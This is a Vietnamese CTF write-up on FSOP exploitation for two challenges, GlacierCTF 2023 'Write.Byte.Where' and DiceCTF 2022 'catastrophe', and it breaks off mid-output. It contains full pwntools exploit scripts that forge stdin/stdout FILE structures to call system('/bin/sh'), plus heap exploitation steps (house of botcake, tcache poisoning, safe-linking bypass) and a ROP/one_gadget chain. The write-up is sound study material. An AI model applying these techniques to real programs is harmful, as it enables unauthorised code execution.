---
title: writeup-FSOP
date: 2025-02-12 00:00:00 +0800
categories: [pwn]
tags: [FSOP]
author: "kuvee"
layout: post
---

- FSOP là 1 kĩ thuật tấn công cấu trúc của ```IO_FILE``` , có rất nhiều bài viết về kĩ thuật này ở google , ta có thể đọc 1 bài viết bằng tiếng việt ở đây [here](https://hackmd.io/@kyr04i/SkF_A-fnn) ... 

file [here](/assets/files/GlacierCTF.2023.7z)
## Write.Byte.Where


### overview


- đầu tiên nó sẽ mở ```/proc/self/maps``` và in ra , nói 1 chút về ```/proc/self/maps``` , đây là 1 đường dẫn trỏ đến tiến trình hiện tại , nó sẽ in vùng nhớ được ánh xạ bởi ```maps``` , vì vậy ở đây ta có được libc_leak , exe_leak , stack_leakleak

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+Ch] [rbp-14h]
  _QWORD v4[2]; // [rsp+10h] [rbp-10h] BYREF

  v4[1] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v4[0] = 0LL;
  fd = open("/proc/self/maps", 0);
  if ( fd < 0 )
  {
    puts("ERROR opening maps\n");
    exit(1);
  }
  if ( read(fd, proc_self_maps, 0x1000uLL) < 0 )
  {
    puts("ERROR reading from maps\n");
    exit(1);
  }
  close(fd);
  puts(proc_self_maps);
  printf("Here is an extra: %p\n", v4);
  printf("Where: ");
  __isoc99_scanf("%lld", v4);
  getchar();
  printf("What: ");
  __isoc99_scanf("%c", v4[0]);
  getchar();
  puts("Goodbye! (press  Enter  to exit)");
  getchar();
  exit(0);
}
```

- tiếp theo là ta được nhập dũ liệu vào 1 địa chỉ với 1 byte duy nhất , như tên bài thì đây là 1 bài ```write-what-where``` tuy nhiên chỉ write được 1 byte duy nhất và ta cũng nên nhớ rằng ta có tất cả các địa chỉ hữu ích cho việc khai thác

- checksec : chỉ có canary là tắt

```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/GlacierCTF.2023$ checksec vuln_patched
[*] '/home/ploi/pwn/FSOP/GlacierCTF.2023/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

### exploit

- vậy ta sẽ làm gì với chỉ mỗi 1 byte , ở đây ta sẽ cùng phân tích cách mà ```get_char``` hoạt động , trước hết ta cần biết bố cục của ```_IO_FILE_STRUCT``` :

```cs
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

- ta sẽ phân tích flow của ```get_char``` : 

đầu tiên là sẽ jmp đến ```__uflow``` 

![get_char1](/assets/images/get_char.png)

tiếp theo jmp đến ```_IO_default_uflow``` 

![get_char1](/assets/images/get_char.png)

cuối cùng là call tại [rbp-0x70]

![get_char1](/assets/images/get_char.png)

- ta sẽ cùng xem xét src của ```_IO_file_underflow```

```c
int _IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  . . .

  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      if (fp->_IO_save_base != NULL)
        {
          free (fp->_IO_save_base);
          fp->_flags &= ~_IO_IN_BACKUP;
        }
      _IO_doallocbuf (fp);
    }

  . . .

  _IO_switch_to_get_mode (fp);

  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);

  . . .

  return *(unsigned char *) fp->_IO_read_ptr;
}
```

- ý định của ta ở bài này là sẽ ghi đè dữ liệu của ```_IO_BUF_END``` để mở rộng được bộ đệm hơn nữa trong memory

![here](/assets/images/fsop.png)

- điều gì sẽ xảy ra khi 1 hàm cố gắng đọc từ ```stdin``` , vd như ```get_char``` , là dữ liệu được gửi trên stdin sẽ được đệm trong bộ đệm và chúng tôi sẽ ghi đè lên phần cuối của ```stdin``` và hơn nữa trong bộ nhớ lên đến ```_Io_buf_end```

![here](/assets/images/fsop2.png)

- và vì ở đây ```stdout``` sẽ nằm xa hơn sau ```sdtin```  0xce0 byte , vì vậy ta có thể ghi được ```stdout```

lúc này ```IO_BUF_END``` đã được mở rộgn thành ```0x7fb2a1132764``` và ta đã ghi đè lên phần còn lại của ```stdin```

![kaka](/assets/images/fsop3.png)

- vì vậy trước hết ta cần setup sao cho các dữ liệu quan trọng ở ```stdin``` sẽ không bị phá hủy , những thứ đó sẽ là ```lock``` , ```offset``` , ```wide_data``` , ```_mode```
- ta sẽ ghi dữ liệu ở vị trí ```_cur_column``` + 3 nên sẽ padding thêm 5 bytes , tiếp theo là ```stdfile_0_lock``` ...

- sau khi overwrite struct ```stdin``` thì ta sẽ padding nó đến ```stdout``` và dùng payload của [nobodyisbody](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout)

exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))


stdout_lock = libc.address + 0x240710   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x000000000014a870 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh'.ljust(8,b'\x00'))  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)


payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff)
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + bytes(fake)

p.send(payload)
p.interactive()
```

![flagfsop](/assets/images/flagfsop.png)

1 cách khác 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
"""
gdb.attach(p,gdbscript='''
           brva 0x00000000000012E4
           brva 0x0000000000001318
           ''')
"""
exe.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'exe: {hex(exe.address)}')

p.recvlines(8)
libc.address = int((b'0x' + p.recvuntil(b'-')[:-1]),16)
log.info(f'libc {hex(libc.address)}')
p.recvuntil(b'Here is an extra: ')
stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
log.info(f'stdin: {hex(libc.sym._IO_2_1_stdin_)}')
log.info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')

_IO_stdfile_0_lock = 0x240720 + libc.address
_IO_wide_data_0 = 0x23e9c0

val = ((libc.sym._IO_2_1_stdout_ + 0x300) & 0xff00) >> 8

input()
p.sendlineafter(b'Where: ',str(libc.sym._IO_2_1_stdin_+0x41))
p.sendafter(b'What: ',p8(val))

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc.symbols['_IO_file_jumps']
stdout = libc.symbols['_IO_2_1_stdout_']
log.info("stdout: " + hex(stdout))
FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        _IO_read_ptr    = 0x0, \
        _IO_write_base  = 0x0, \
        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
        )

payload = b'a'*5 + p64(_IO_stdfile_0_lock) + p64(0xffffffffffffffff) + p64(0) + p64(_IO_wide_data_0 + libc.address) + p64(0)*3 + p64(0x00000000ffffffff)
payload += p64(0)*2 + p64(libc.sym._IO_file_jumps)
payload = payload.ljust(0xc5d,b'a') + FSOP

p.send(payload)
p.interactive()
```

ref : [>=libc2.35](https://hareh4ru.github.io/pwn/2023/11/23/FSOP-for-libc-2.35-and-over.html)



## catastrophe

file [here](/assets/files/dice-2022.7z)
### overview

checksec : full giáp

```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/dice-2022$ checksec catastrophe
[*] '/home/ploi/pwn/FSOP/dice-2022/catastrophe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- ta có 3 option chính ở bài này , ta sẽ cùng nhau đi phân tích nó 

```cs
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 number; // rax

  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  while ( 1 )
  {
    print_menu();
    number = get_number();
    if ( number == 4 )
    {
      puts("Bye!");
      exit(0);
    }
    if ( number <= 4 )
    {
      switch ( number )
      {
        case 3uLL:
          op_view();
          goto LABEL_13;
        case 1uLL:
          op_malloc();
          goto LABEL_13;
        case 2uLL:
          op_free();
          goto LABEL_13;
      }
    }
    puts("Invalid choice!");
LABEL_13:
    putchar(10);
  }
}
```

- op-malloc:  ta được input 1 size <=0x200 và malloc , cuối cùng là nhập dữ liệu vào chunk  
```cs
int op_malloc()
{
  __int64 index; // [rsp+0h] [rbp-10h]
  unsigned __int64 size; // [rsp+8h] [rbp-8h]

  puts("Index?");
  index = get_index();
  puts("Size?");
  size = get_number();
  if ( !size || size > 0x200 )
    return puts("Interesting...");
  *((_QWORD *)&chonks + index) = malloc(size);
  printf("Enter content: ");
  return (unsigned int)fgets(*((char **)&chonks + index), size, stdin);
}
```

- op_free: nhập 1 idx và free() , ở đây sẽ xảy ra bug ```UAF``` vì không xóa con trỏ

```cs
void op_free()
{
  __int64 index; // [rsp+8h] [rbp-8h]

  puts("Index?");
  index = get_index();
  free(*((void **)&chonks + index));
}
```

- op_view: nhập 1 idx và in dữ liệu của chunk[idx]

```cs
int op_view()
{
  __int64 index; // [rsp+8h] [rbp-8h]

  puts("Index?");
  index = get_index();
  return puts(*((const char **)&chonks + index));
}
```

- libc được sử dụng ở bài này là 2.35 (không dùng được hook , có tcache và Safe-linking)  , ta có thể xem cách ```safe-linking``` hoạt động ở [here](https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation)  , mặc khác ta cũng không thể overwrite được GOT , vậy cách mà ta suy nghĩ cuối cùng có lẽ là sử dụng ROP_CHAIN trên stack hoặc là ```exit_handle``` hoặc ```overwrite_got_libc``` tuy  nhiên thì ở bài này mình sẽ làm cách 1, vì vậy ta cần phải leak được địa chỉ stack , muốn leak stack thì ta phải leak libc trước để có ```environ``` và ta cũng cần leak heap để bypasss được ```safe-linking```
- trước hết ta cần setup để có được ```libc_address``` và ```heap_address```


```python
for i in range(7): malloc(i,0x100,b'a')

free(0)
view(0)
heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
log.info(f'heap base: {hex(heap_base)}')
```

- tiếp theo ta chỉ việc malloc() lại , 3 chunk tiếp theo sẽ được sử dụng cho kỹ thuật ```house_of_botcake``` , đây là 1 phương pháp tấn công tcache_poisioning nhưng mạnh mẽ hơn , nó sử dụng hợp nhất chunk để tạo ra 1 double free trong tcache , ta có thể đọc ở đây [here](https://4xura.com/pwn/house-of-botcake/)

- ta sẽ malloc 2 chunk 0x100 và 1 chunk để tránh gộp với top chunk , đồng thời ta sẽ free 8 chunk , chunk thứ 8 sẽ đi vào unsorted bin và ta có thể leak libc 

```cs
malloc(0,0x100,b'a')

malloc(7,0x100,b'a')
malloc(8,0x100,b'a')

malloc(9,0x10,b'c')

for i in range(7): free(i)
free(7)
view(7)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
environ = libc.sym.environ
binsh = next(libc.search(b'/bin/sh\x00'))
stdout = libc.address + 0x21a780
log.info(f'libc: {hex(libc.address)}')
log.info(f'environ: {hex(environ)}')
log.info(f'binsh: {hex(binsh)}')
log.info(f'stdout: {hex(stdout)}')
```

- ta có thể thấy nó như sau , lúc này nếu ta free() chunk ở kế tiếp nó , nó sẽ đi tìm chunk free liền kề và 2 thằng này sẽ được hợp nhất với nhau 

```cscs
0x5558b5d9ca00  0x0000000000000000      0x0000000000000111      ................         <-- unsortedbin[all][0]
0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caa0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cab0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cac0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cad0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cae0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb10  0x0000000000000110      0x0000000000000110      ................
0x5558b5d9cb20  0x0000000000000a61      0x0000000000000000      a...............
0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc20  0x0000000000000000                              ........
```

- vậy ta sẽ làm được điều gì với điều này ?  

```cs
0x5558b5d9ca00  0x0000000000000000      0x0000000000000221      ........!.......         <-- unsortedbin[all][0]
0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9ca90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caa0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cab0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cac0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cad0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cae0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9caf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb10  0x0000000000000110      0x0000000000000110      ................
0x5558b5d9cb20  0x0000000000000a61      0x0000000000000000      a...............
0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb40  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb50  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc20  0x0000000000000220      0x0000000000000020       ....... .......
0x5558b5d9cc30  0x0000000000000a63      0x0000000000000000      c...............
0x5558b5d9cc40  0x0000000000000000      0x00000000000203c1      ................         <-- Top chunk
```

ta hãy cùng xem trong bins lúc này , nếu ta malloc lại 1 chunk để lấy chunk entry_tcache ra và tiếp tục free() chunk thứ 8 thì lúc này cả 2 sẽ nằm ở các bin khác nhau đúng chứ? , vì vậy nếu ta malloc 1 chunk ở ```unsorted_bin``` với 1 kích thước vừa đủ , ta hoàn toàn có thể overwrite được ```fd``` của chunk thứ 8 

```cs
pwndbg> bins
tcachebins
0x110 [  7]: 0x5558b5d9c900 —▸ 0x5558b5d9c7f0 —▸ 0x5558b5d9c6e0 —▸ 0x5558b5d9c5d0 —▸ 0x5558b5d9c4c0 —▸ 0x5558b5d9c3b0 —▸ 0x5558b5d9c2a0 ◂— 0
fastbins
empty
unsortedbin
all: 0x5558b5d9ca00 —▸ 0x7f6eb4305ce0 ◂— 0x5558b5d9ca00
smallbins
empty
largebins
empty
```
- ta thấy lúc này nếu ta yêu cầu malloc với 1 chunk 0x130 , unsorted sẽ cắt 1 phần ra và ta đã ovewrite thành công được fd trong tcache , chú ý là nó sử dụng ```safe-linking``` nên ta cần mã hóa nó bằng cách ```target ^ (heap_base >> 12)```
```cs
0x5558b5d9ca00  0x0000000000000000      0x0000000000000141      ........A.......
0x5558b5d9ca10  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca20  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca30  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca40  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca50  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca60  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca70  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca80  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9ca90  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9caa0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cab0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cac0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cad0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cae0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9caf0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cb00  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x5558b5d9cb10  0x6161616161616161      0x0000000000000111      aaaaaaaa........
0x5558b5d9cb20  0x00007f6be1bb3a1c      0x9966da748f80000a      .:..k.......t.f.         <-- tcachebins[0x110][0/7]
0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb40  0x0000000000000000      0x00000000000000e1      ................         <-- unsortedbin[all][0]
0x5558b5d9cb50  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
```

- lúc này ta thấy ta đã overwrite thành công ```fd``` trong tcache và nó trỏ đến ```stdout``` , ta sẽ sử dụng ```FSOP``` để leak địa chỉ stack 

```cs
pwndbg> bins
tcachebins
0x110 [  7]: 0x5558b5d9cb20 —▸ 0x7f6eb4306780 (_IO_2_1_stdout_) ◂— 0x70d466b81
fastbins
empty
unsortedbin
all: 0x5558b5d9cb40 —▸ 0x7f6eb4305ce0 ◂— 0x5558b5d9cb40
smallbins
empty
largebins
empty
```

- ta thấy được sau khi các hàm được gọi , nó sẽ sử dụng ```putchar``` : 

```cs
 0x7f6eb416ea62 <putchar+98>     mov    rdx, qword ptr [rdi + 0x28]     RDX, [_IO_2_1_stdout_+40] => 0x7f6eb430d208 ◂— 0
   0x7f6eb416ea66 <putchar+102>    movzx  eax, bpl                        EAX => 0xa
   0x7f6eb416ea6a <putchar+106>    cmp    rdx, qword ptr [rdi + 0x30]     0x7f6eb430d208 - 0x7f6eb430d208     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x7f6eb416ea6e <putchar+110>    jb     putchar+161                 <putchar+161>

   0x7f6eb416ea70 <putchar+112>    mov    esi, eax                        ESI => 0xa
 ► 0x7f6eb416ea72 <putchar+114>    call   __overflow                  <__overflow>
        arg0: 0x7f6eb4306780 (_IO_2_1_stdout_) ◂— 0xfbad1800
        arg1: 0xa

   0x7f6eb416ea77 <putchar+119>    test   dword ptr [rbx], 0x8000
   0x7f6eb416ea7d <putchar+125>    je     putchar+180                 <putchar+180>

   0x7f6eb416ea7f <putchar+127>    add    rsp, 0x18
   0x7f6eb416ea83 <putchar+131>    pop    rbx
   0x7f6eb416ea84 <putchar+132>    pop    rbp
```

- tiếp theo là gọi  ```_IO_do_write```

rdi là stdout , rsi là _IO_write_base , rdx là ```_IO_write_ptr - _IO_write_base```
```cs
 0x7ffff7e1ff3e <_IO_file_overflow+254>    call   _IO_do_write                <_IO_do_write>
        rdi: 0x7ffff7fad780 (_IO_2_1_stdout_) ◂— 0xfbad2887
        rsi: 0x7ffff7fad803 (_IO_2_1_stdout_+131) ◂— 0xfaea70000000000a /* '\n' */
        rdx: 1
        rcx: 0xc00


```
- cuối cùng là 
```
 0x7ffff7e1fa5d <_IO_do_write+173>    call   qword ptr [r14 + 0x78]      <_IO_file_write>
        rdi: 0x7ffff7fad780 (_IO_2_1_stdout_) ◂— 0xfbad2887
        rsi: 0x7ffff7fad803 (_IO_2_1_stdout_+131) ◂— 0xfaea70000000000a /* '\n' */
        rdx: 1
        rcx: 0xc00
```

- nói chung quá trình chi tiết ta cần đọc ở đây [here](https://zenn.dev/t0m3y/articles/d42397182c694d#fsop) , vậy ta sẽ setup như sau :

```python
payload = flat(
        0xfbad1800,        # flags
        libc.sym.environ,  #_IO_read_ptr
        libc.sym.environ,  #_IO_read_ptr
        libc.sym.environ,  #_IO_write_ptr
        libc.sym.environ,   #_IO_write_base
        libc.sym.environ+8, #_IO_write_ptr
        libc.sym.environ+8, #_IO_write_end
        libc.sym.environ+8, #_IO_buf_base
        libc.sym.environ+8, #_IO_buf_end
        )
```

- vậy ta sẽ ghi đè cấu trúc của ```stdout```  , và free() lại 2 chunk lúc nãy , lúc này ta đã có thể ghi tùy ý , ta sẽ tiếp tục malloc lại chunk có size 0x130 để overwrite ```fd``` của chunk kế tiếp nằm trong tcache

```cs
tcachebins
0x110 [  6]: 0x55ecb48c0b20 ◂— 0x70a2de07f
0x140 [  1]: 0x55ecb48c0a10 ◂— 0
```

- nó sẽ trông như sau: 


```cs
free(1)
free(2)

payload2 = flat(
        b'a'*0x108 + p64(0x111) + p64(obfuscate(saved_rbp,heap_base))
        )
pop_rsi = libc.address + 0x0000000000126101
pop_rdi = 0x000000000002a3e5
pop_rdx_rbx = libc.address + 0x0000000000090529

input()
payload3 = p64(heap_base+0x78)
payload3 += p64(pop_rsi) + p64(0)
payload3 += p64(pop_rdx_rbx) + p64(0)*2
payload3 += p64(0xebcf8+libc.address)  #rsi null , rdx null
malloc(5,0x130,payload2)
malloc(6,0x100,b'nothing')
malloc(7,0x100,payload3)
```

- ở đây mình dùng one_gadget ```0xebcf8``` , ta cần setup ```rbp-0x78``` là 1 địa chỉ có thể ghi và ```rsi và rdx là NULL```


```cs
ploi@PhuocLoiiiii:~/pwn/FSOP/dice-2022/catastrophe/bin$ one_gadget libc.so.6
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
